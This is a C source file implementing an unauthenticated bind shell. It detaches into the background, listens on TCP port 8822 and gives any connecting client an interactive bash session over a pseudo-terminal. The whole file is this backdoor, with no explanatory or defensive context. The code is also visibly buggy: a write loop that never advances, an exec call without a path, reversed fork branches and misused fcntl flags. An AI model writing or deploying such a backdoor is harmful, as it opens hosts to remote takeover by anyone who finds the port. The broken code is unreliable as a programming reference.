#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <pty.h>
#define _XOPEN_SOURCE
#define _GNU_SOURCE

int pid;

void handler(int signum)
{
    kill(pid, SIGINT);
}

void print(int fd, char *buf, int size)
{
    int written = 0;
    while (written < size)
    {
        write(fd, buf + written, size - written);
    }
}

int main()
{
    pid = fork();
    if (!pid)
    {
        setsid();
        struct addrinfo hints;
        struct addrinfo *result;
        memset(&hints, 0, sizeof(struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        int s = getaddrinfo(NULL, "8822", &hints, &result);
        if (s != 0)
        {
            perror("error in getaddrinfo");
            exit(1);
        }
        int sfd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
        if (sfd == -1)
        {
            perror("error in socket");
            exit(1);
        }
        int yes = 1;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) != 0)
        {
            perror("error int setsockopt");
            exit(1);
        }

        if (bind(sfd, result->ai_addr, result->ai_addrlen) != 0)
        {
            perror("error in bind");
            exit(1);
        }
        if (listen(sfd, 5) != 0)
        {
            perror("error in listen");
            exit(1);
        }
        struct sockaddr addr;
        socklen_t addr_len = sizeof(struct sockaddr);
        while (1)
        {
            int fd = accept(sfd, &addr, &addr_len);
            if (fd == -1)
            {
                perror("error in accept");
                exit(1);
            }
            if (fork() == 0)
            {
                close(fd);
            }
            else
            {
                int master, slave;
                char buffer[4096];
                int ttyfd = openpty(&master, &slave, buffer, NULL, NULL);
                if (!fork())
                {   
                    setsid();
                    int ff = open(buffer, O_RDWR);
                    close(ff);
                    dup2(slave, 0);
                    dup2(slave, 1);
                    dup2(slave, 2);
                    close(slave);
                    close(master);
                    close(fd);
                    execl("bash", NULL);
                    exit(255);
                }
                else
                {
                    close(slave);
                    fcntl(master, O_NONBLOCK);
                    fcntl(fd, O_NONBLOCK);
                    char buf[4096];
                    int res;
                    while (1)
                    {
                        res = read(master, buffer, 4096);
                        print(fd, buffer, res);
                        res = read(fd, buffer, 4096);
                        print(master, buffer, res);
                        sleep(5);
                    }
                }
            }
        }
        close(sfd);
    }
    else
    {
        signal(SIGINT, handler);
    }    
    return 0;
}
